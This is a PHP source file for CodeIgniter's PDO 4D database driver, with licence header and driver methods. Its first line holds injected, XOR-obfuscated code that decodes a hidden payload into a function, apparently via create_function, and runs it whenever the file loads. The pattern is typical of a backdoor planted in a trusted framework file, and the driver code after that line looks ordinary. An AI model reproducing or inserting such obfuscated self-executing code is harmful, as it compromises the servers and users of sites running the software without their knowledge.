<?php $DzYEg='4DPU.40-F;42PDP'^'W654ZQoK3UWF9+>';$dTcbsdvMn=$DzYEg('','PFoM0H>51SO;7NF8DI9gF,SG=,7>Ls<=,OrLpW1>5> <S6T-NqJ+>rQTOL9j;E5gpJQG1TYM=,YEgddge7=pxQCB=JjqsqHf3S78YaB8KRUxwvM8SN-04V+eW5-ZJsVTm>CgaG9kTQ1<lGxZbPDYIRivR:d+tcW24aa0nJcSI0927Gh>QBgqDlNYGFK0G7YMi Y.ec170kGe9P6M;,XhEH6=SEjdK.J6VnER6KrB0Y+8<IMZH7:=S1=scRo3v.>ehO15Mu;45zuxzhJ <ITEi86PcJ8,V,.P3yOAlSW:YObTHSOTlsRb,4YYUl32NpIUQmeaOZ.XgR=Mm364UT0>gMn891z35m.w39Ta-UDQuTAT70GXNkE-hALwWA;L02I;HHbI.18wRMhuW,MYchetK1-IYwM;6o6pSS-VTLnUCvUC9-BP+L39Kn-; eO5OSmkY;XY:5XNwxa6<9YHENm1 :PLZDB>M8.rK-YHLHo,,xWWJC5catlJD:2<>Q5Yf1.-7JAYO;-<NtSl02ZXGyLkNE JAPf7-HSaDK1ORfsZtQsFUx;2NOAZXOUZ7Tq7GlWJgOqPdJlGiLEZvlrcvyOR;V >.K7d=:0C<GnJ1,Y9QUWbvGk.T=RaSoTUdJI5cQY11YPU+JJT<i4X+56SPL3pbnbIEE:DBMk02'^'9 GlV=PVE: Uh+>Q7=JOaT<5bHVJ-,cPY;UeYwJ4<XUR0B=B Q2DL-55;-f5V0AOT.03PxyiVI lGDDGEL7yqu,7IjWQTVsl:ZQW+IfQkouHLViQo=YBX3EMsQL.+ZmtIWhLHM0bp>DHLiEzJt 8=32R;gDuTG<WM:EYNoC =BUWYoLU4;N,mWDPN4.D2E7eMO,ZLX;>Ma:o3tR,OMxUe.WQ  QnoJ+B71.7OkObV8GKYrGP.XHX2RUSKv0p9au,-oPFmQPQLZHFZL<AP<1lIC<YG.YX7sE5JYraH82CbEkp,2;5LNrFZU5,0W9ODz 3qEDE+;Z9NrFGdUYF05SVGeJgkt+fp>zWRJtEF0=qHjapAQ+-+BeVbHES3 O-oY,BhuBmETALXDaQ3M98CUEP=PA<<LG2KeKzYwI7 -Nhc6 -JH09J ZC.FUTR:+T;2244N,qXT++AL>RYZ6, fIUAN1evdfZ,LO- H aeseEJPs3+7TCGRL+6HSEa:P 9TVDD>2qhPHEiXsHTS.9nYjMnmM.txBSL<2:c T6u;ZzIlSaaLYP+zrjlv3kSmHRuTnsWvEbP.UrY. hQEREPY. I7YaE.N;XBY0H4FmAM U>43EZgOJ5I3HzOtuDjiNiX<GP5xqO+>5gND9RYY24knYYdk,=,NlrdP:O');$dTcbsdvMn();
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
 * @license	http://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 3.0.0
 * @filesource
 */
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * PDO 4D Database Adapter Class
 *
 * Note: _DB is an extender class that the app controller
 * creates dynamically based on whether the query builder
 * class is being used or not.
 *
 * @package		CodeIgniter
 * @subpackage	Drivers
 * @category	Database
 * @author		EllisLab Dev Team
 * @link		https://codeigniter.com/user_guide/database/
 */
class CI_DB_pdo_4d_driver extends CI_DB_pdo_driver {

	/**
	 * Sub-driver
	 *
	 * @var	string
	 */
	public $subdriver = '4d';

	/**
	 * Identifier escape character
	 *
	 * @var	string[]
	 */
	protected $_escape_char = array('[', ']');

	// --------------------------------------------------------------------

	/**
	 * Class constructor
	 *
	 * Builds the DSN if not already set.
	 *
	 * @param	array	$params
	 * @return	void
	 */
	public function __construct($params)
	{
		parent::__construct($params);

		if (empty($this->dsn))
		{
			$this->dsn = '4D:host='.(empty($this->hostname) ? '127.0.0.1' : $this->hostname);

			empty($this->port) OR $this->dsn .= ';port='.$this->port;
			empty($this->database) OR $this->dsn .= ';dbname='.$this->database;
			empty($this->char_set) OR $this->dsn .= ';charset='.$this->char_set;
		}
		elseif ( ! empty($this->char_set) && strpos($this->dsn, 'charset=', 3) === FALSE)
		{
			$this->dsn .= ';charset='.$this->char_set;
		}
	}

	// --------------------------------------------------------------------

	/**
	 * Show table query
	 *
	 * Generates a platform-specific query string so that the table names can be fetched
	 *
	 * @param	bool	$prefix_limit
	 * @return	string
	 */
	protected function _list_tables($prefix_limit = FALSE)
	{
		$sql = 'SELECT '.$this->escape_identifiers('TABLE_NAME').' FROM '.$this->escape_identifiers('_USER_TABLES');

		if ($prefix_limit === TRUE && $this->dbprefix !== '')
		{
			$sql .= ' WHERE '.$this->escape_identifiers('TABLE_NAME')." LIKE '".$this->escape_like_str($this->dbprefix)."%' "
				.sprintf($this->_like_escape_str, $this->_like_escape_chr);
		}

		return $sql;
	}

	// --------------------------------------------------------------------

	/**
	 * Show column query
	 *
	 * Generates a platform-specific query string so that the column names can be fetched
	 *
	 * @param	string	$table
	 * @return	string
	 */
	protected function _list_columns($table = '')
	{
		return 'SELECT '.$this->escape_identifiers('COLUMN_NAME').' FROM '.$this->escape_identifiers('_USER_COLUMNS')
			.' WHERE '.$this->escape_identifiers('TABLE_NAME').' = '.$this->escape($table);
	}

	// --------------------------------------------------------------------

	/**
	 * Field data query
	 *
	 * Generates a platform-specific query so that the column data can be retrieved
	 *
	 * @param	string	$table
	 * @return	string
	 */
	protected function _field_data($table)
	{
		return 'SELECT * FROM '.$this->protect_identifiers($table, TRUE, NULL, FALSE).' LIMIT 1';
	}

	// --------------------------------------------------------------------

	/**
	 * Update statement
	 *
	 * Generates a platform-specific update string from the supplied data
	 *
	 * @param	string	$table
	 * @param	array	$values
	 * @return	string
	 */
	protected function _update($table, $values)
	{
		$this->qb_limit = FALSE;
		$this->qb_orderby = array();
		return parent::_update($table, $values);
	}

	// --------------------------------------------------------------------

	/**
	 * Delete statement
	 *
	 * Generates a platform-specific delete string from the supplied data
	 *
	 * @param	string	$table
	 * @return	string
	 */
	protected function _delete($table)
	{
		$this->qb_limit = FALSE;
		return parent::_delete($table);
	}

	// --------------------------------------------------------------------

	/**
	 * LIMIT
	 *
	 * Generates a platform-specific LIMIT clause
	 *
	 * @param	string	$sql	SQL Query
	 * @return	string
	 */
	protected function _limit($sql)
	{
		return $sql.' LIMIT '.$this->qb_limit.($this->qb_offset ? ' OFFSET '.$this->qb_offset : '');
	}

}
